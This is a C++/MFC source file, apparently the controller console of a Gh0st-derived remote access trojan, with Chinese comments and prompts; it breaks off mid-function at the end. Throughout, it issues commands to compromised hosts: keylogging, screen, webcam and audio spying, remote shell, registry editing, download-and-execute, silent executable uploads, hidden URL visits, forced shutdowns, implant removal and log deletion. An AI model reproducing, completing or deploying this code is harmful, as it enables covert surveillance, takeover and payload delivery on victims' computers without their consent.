				    BOOL b_chk   = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "Alarm", false);
				    if (b_chk != false)
					{
					    PlaySound(MAKEINTRESOURCE(IDR_WAVE1),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
					}

					/************************************/

					break;
				}		
			}
			
			// 关闭相关窗口
			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:
			case SCREENSPY_DLG:
			case WEBCAM_DLG:
			case AUDIO_DLG:
			case KEYBOARD_DLG:
			case SYSTEM_DLG:
			case SHELL_DLG:
			case REGEDIT_DLG:
			case SERMANAGER_DLG:
            case USER_DLG:
				//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
				((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
				break;
				break;
			default:
				break;
				break;
			}
		}catch(...){}
	}
	
	// 更新当前连接总数
	g_pTabView->UpDateNumber();
	g_pFrame->ShowConnectionsNumber();
	return 0;
}

void CPcView::SendALLSelectCommand(PBYTE pData, UINT nSize)
{
	if ( g_pConnectView == NULL ) //没有主机
    {
//				AfxMessageBox("尚未初始化,请等待主机上线.");
            return;
    }

	CPcView* pView = NULL;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();



	int p = 0;
	for (int n = 0; n < nTabs; n++ )
	{

		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		int nCnt = pView->m_pListCtrl->GetItemCount();

		POSITION pos = pView->m_pListCtrl->GetFirstSelectedItemPosition();
		while(pos)
		{
			int nItem = pView->m_pListCtrl->GetNextSelectedItem(pos);
			pView->m_pListCtrl->SetCheck(nItem,TRUE);                
		}
			
		for(int x = 0; x < nCnt; x++)
		{
			if (pView->m_pListCtrl->GetCheck(x) == TRUE)
				p = p + 1;			
		}		

		if (p == 0)
			return;
		for(int i = 0; i < nCnt; i++)//建立循环
		{
			if (pView->m_pListCtrl->GetCheck(i) == TRUE)//复选框选中则发送
			{                
				ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
				m_iocpServer->Send(pContext, pData, nSize);
			}
		}
	}
}

void CPcView::SendSelectCommand(PBYTE pData, UINT nSize)
{

    POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();

	while(pos)
	{
		int nItem =m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetCheck(nItem,TRUE);                
	}
 	CPcView* pView = NULL;		
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
		
	int nItems = pView->m_pListCtrl->GetItemCount();       
	int p = 0;
	for(int x = 0; x < nItems; x++)
	{
		if (pView->m_pListCtrl->GetCheck(x) == TRUE)
			p = p + 1;	
	}
	if (p == 0)
		return;
    for(int i = 0; i < nItems; i++)//建立循环
    {
        if (pView->m_pListCtrl->GetCheck(i) == TRUE)//复选框选中则发送
        {             
			OutputDebugString("send正常");   
            ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
            m_iocpServer->Send(pContext, pData, nSize);
        }
    }     
/*
	if ( g_pConnectView == NULL ) //没有主机
	{
		AfxMessageBox("请选择主机！");
		return;
	}
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		m_iocpServer->Send(pContext, pData, nSize);                
	}
*/	
}

void CPcView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	//	m_listCtrl.SetSortImage(m_nSortedCol, m_bAscending);
	CXTSortClass csc(m_pListCtrl, m_nSortedCol);
	csc.Sort(m_bAscending, xtSortString);
}

BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	return CListView::OnNotify(wParam, lParam, pResult);
}

void CPcView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	CString strLogText;
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	if ( pos == NULL )
	{
		return;
	}
	if (MessageBox("确认断开连接吗 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	while (pos) 
	{	
		int n = m_pListCtrl->GetNextSelectedItem(pos);
		
		strLogText.Format( "主机断开: [%s - %s]", m_pListCtrl->GetItemText( n, 0 ), m_pListCtrl->GetItemText(n, 1) );
		
		g_pLogView->InsertLogItem( strLogText, 0, 1 );
		
		strLogText = m_pListCtrl->GetItemText( n, 3 );
		strLogText.MakeUpper();
		if ( strLogText.Find("NT") != -1 )
		{
			g_pNumDlg->NT--;
			g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
		}
		if ( strLogText.Find("XP") != -1 )
		{
			g_pNumDlg->XP--;
			g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
		}
		if ( strLogText.Find("Vista") != -1 )
		{
			g_pNumDlg->Vista--;
			g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
		}
		if ( strLogText.Find("Win7") != -1 )
		{
			g_pNumDlg->Win7--;
			g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
		}
		if ( strLogText.Find("2000") != -1 )
		{
			g_pNumDlg->Win2000--;
			g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
		}
		if ( strLogText.Find("2003") != -1 )
		{
			g_pNumDlg->Win2003--;
			g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
		}
		if ( strLogText.Find("2008") != -1 )
		{
			g_pNumDlg->Win2008--;
			g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
		}
		
		m_pListCtrl->DeleteItem(n);	
	}
	
	g_pTabView->UpDateNumber();
	g_pFrame->ShowConnectionsNumber();
}

void CPcView::OnFilemanager() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnScreenspy() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnKeyboard() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnRemoteshell() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnSystem() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnSermanager() 
{
	// TODO: Add your command handler code here

	OutputDebugString("发出了");
	BYTE	bToken = COMMAND_SERMANAGER;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnWebcam() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnAudioListen() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnRegedit()   //注册表
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken,sizeof(BYTE));
}

void CPcView::OnRenameRemark() 
{
	// TODO: Add your command handler code here
	CString strTitle;

	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format("更改主机(%s)的备注", m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 0));
	else
		strTitle = "批量更改主机备注";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}
	
	delete[] lpPacket;
}

void CPcView::OnShowmsg() 
{
	// TODO: Add your command handler code here

	CMsgBox dlg;
	dlg.DoModal();
}

void CPcView::OnRemove() 
{
	// TODO: Add your command handler code here

	if (MessageBox("确认卸载服务端吗??", "警告!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnLogoff() 
{
	// TODO: Add your command handler code here

	if (MessageBox("确认注销服务端吗??", "警告!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CPcView::OnReboot() 
{
	// TODO: Add your command handler code here

	if (MessageBox("确认重启服务端吗??", "警告!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CPcView::OnShutdown() 
{
	// TODO: Add your command handler code here

	if (MessageBox("确认关闭服务端吗??", "警告!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CPcView::OnDownexec() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnUpdateServer() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnSelectAll() //选择全部
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);//这是列表激活，个人觉得看起来更像选中
		m_pListCtrl->SetCheck( i, TRUE);  
	}
}

void CPcView::OnUnselectAll() //取消选择
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);//这里同上
		m_pListCtrl->SetCheck( i, FALSE);  
	}
}

void CPcView::OnChangeGroup() 
{
	// TODO: Add your command handler code here

	CChangeGroup m_group;
	if ( m_group.DoModal() == IDOK )
	{	
		
		int	nPacketLength = m_group.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		
		CString strTemp, strGroupName;
		CPcView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( "%s(0)", m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
			pView->NewInitialUpdate();
			pView->m_iocpServer = m_iocpServer;
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);
			
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));
			
			int nCnt = pView->m_pListCtrl->GetItemCount();
			int i = 0;
			
			// i = pView->m_pListCtrl->InsertItem(nCnt, "", 0);
		
			///////////////////////////////修改BUG/////////////////////////////////////////////

			LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
			CString stryu;
		
			if (LoginInfo->bIsWebCam)
			{
				i = pView->m_pListCtrl->InsertItem(nCnt, stryu , 0);
			}
			else
			{
				i = pView->m_pListCtrl->InsertItem(nCnt, stryu, 1);
			}
			
			/////////////////////////////////////////////////////////////////////////////////
			//网络类型
			pView->m_pListCtrl->SetItemText(i, 0, m_pListCtrl->GetItemText(m, 0));
			
			// 外网IP
			pView->m_pListCtrl->SetItemText(i, 1, m_pListCtrl->GetItemText(m, 1));
			
			// 内网IP
			pView->m_pListCtrl->SetItemText(i, 2, m_pListCtrl->GetItemText(m, 2));
			
			// 主机名
			pView->m_pListCtrl->SetItemText(i, 3, m_pListCtrl->GetItemText(m, 3));
			
			// 系统
			pView->m_pListCtrl->SetItemText(i, 4, m_pListCtrl->GetItemText(m, 4));
			
			// CPU
			pView->m_pListCtrl->SetItemText(i, 5, m_pListCtrl->GetItemText(m, 5));
			
			// 硬盘大小、内存大小
			pView->m_pListCtrl->SetItemText(i, 6, m_pListCtrl->GetItemText(m, 6));

			// 视频状况
			pView->m_pListCtrl->SetItemText(i, 7, m_pListCtrl->GetItemText(m, 7));

			// 服务版本
			pView->m_pListCtrl->SetItemText(i, 8, m_pListCtrl->GetItemText(m, 8));

			// 服务安装时间
			pView->m_pListCtrl->SetItemText(i, 9, m_pListCtrl->GetItemText(m,9));

			// 开机运行
			pView->m_pListCtrl->SetItemText(i, 10, m_pListCtrl->GetItemText(m, 10));
	
			// Speed
			pView->m_pListCtrl->SetItemText(i, 11, m_pListCtrl->GetItemText(m, 11));
			
			// 地理位置
			pView->m_pListCtrl->SetItemText(i, 12, m_pListCtrl->GetItemText(m, 12));


			
			// 指定唯一标识
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			
			g_pTabView->UpDateNumber();
			g_pFrame->ShowConnectionsNumber();
		}
	}

	// 更新当前连接总数
//	g_pTabView->UpDateNumber();
//	g_pFrame->ShowConnectionsNumber();
}

LRESULT CPcView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT CPcView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenSerManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CSerManager	*dlg = new CSerManager(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SERMANA, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SERMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //注册表
{

    ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);
	//设置父窗口为卓面
    dlg->Create(IDD_REG_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenUserDialog(WPARAM wParam, LPARAM lParam)  //服务器窗口
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CUser	*dlg = new CUser(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_ADD_USER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = USER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

////////////////////////////////////////先试试
void CPcView::OnIplist() 
{
	// TODO: Add your command handler code here
	   CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("文本文件|*.txt"), NULL);
	   if (dlg.DoModal() != IDOK)
		   return;
	   CFile file;
	   char ip[50] = {0};
	   if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	   {
		   POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		   while (pos)
		   {
			   int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			   CString strTitle;
			   strTitle.Format(_T("%s%s"), m_pListCtrl->GetItemText(nItem, 0), _T("\r\n"));
			   file.Write(strTitle, strlen(strTitle));
		   }
		   file.Close();
		   AfxMessageBox(_T("IP列表导出成功!"));
	   }
}

void SetClipboardText(CString &Data)
{
	if(OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		MoveMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CPcView::OnIp() 
{

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 1);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);
}

void CPcView::OnBeizhu() 
{

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 3);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CPcView::OnDilixinxi() 
{

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 11);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CPcView::OnAll() 
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		Name = "";
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		for(int i = 0; i < m_pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
		{
			Name += m_pListCtrl->GetItemText(nItem, i);
			Name += " ";
		}
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CPcView::OnStartHide() 
{

	// TODO: Add your command handler code here
	CString strTitle;

	AfxMessageBox("上传至远程系统盘Program Files文件夹下，传输文件过大时，请耐心等候！");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"可执行文件|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	unsigned char *data = NULL;   
	size_t size;   

	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_HIDE;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}
void CPcView::OnStartNormal() 
{

	// TODO: Add your command handler code here
	CString strTitle;

    AfxMessageBox("上传至远程系统盘Program Files文件夹下，传输文件过大时，请耐心等候！");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"可执行文件|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	//	AfxMessageBox(dlg->GetPathName());
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_NORMAL;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}
void CPcView::OnUpdata() 
{

	// TODO: Add your command handler code here
	CString strTitle;

    AfxMessageBox("上传至远程系统盘Program Files文件夹下，传输文件过大时，请耐心等候！");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"可执行文件|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_UPDATA;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}
void CPcView::OnNoStart() 
{

	// TODO: Add your command handler code here
	CString strTitle;

    AfxMessageBox("上传至远程系统盘Program Files文件夹下，传输文件过大时，请耐心等候！");
	
	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"可执行文件|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	//	AfxMessageBox(dlg->GetPathName());
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_NOSTART;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}

void CPcView::OnAddUser()   //服务器
{
	BYTE	bToken = COMMAND_SERVER_START;
	SendSelectCommand(&bToken,sizeof(BYTE));
}

void CPcView::OnAqglRz() 
{
	// TODO: Add your command handler code here

	if (MessageBox("您真的要删除日志?", "提示", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
